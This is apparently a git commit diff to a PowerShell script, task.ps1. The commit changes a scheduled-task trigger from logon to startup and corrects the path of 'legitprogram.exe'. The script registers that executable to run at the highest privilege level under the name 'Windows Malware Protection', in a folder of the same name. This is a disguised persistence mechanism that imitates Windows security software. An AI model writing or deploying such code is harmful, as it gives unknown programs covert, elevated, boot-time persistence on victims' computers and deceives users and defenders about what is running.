2483a0aab34113882a19e12aba125c2f953989b1
Nooble <kieranaslett@gmail.com>
2019-01-31 19:59:35 +0000

    Update task.ps1

--- task.ps1
+++ task.ps1
@@ -1,3 +1,3 @@
-$trigger = New-JobTrigger -AtLogon
-$action = New-ScheduledTaskAction -Execute 'C:\Program Data\Windows Malware Protection\legitprogram.exe'
+$trigger = New-JobTrigger -AtStartup
+$action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
 Register-ScheduledTask -Action $action -Trigger $trigger -RunLevel Highest -TaskName "Windows Malware Protection"
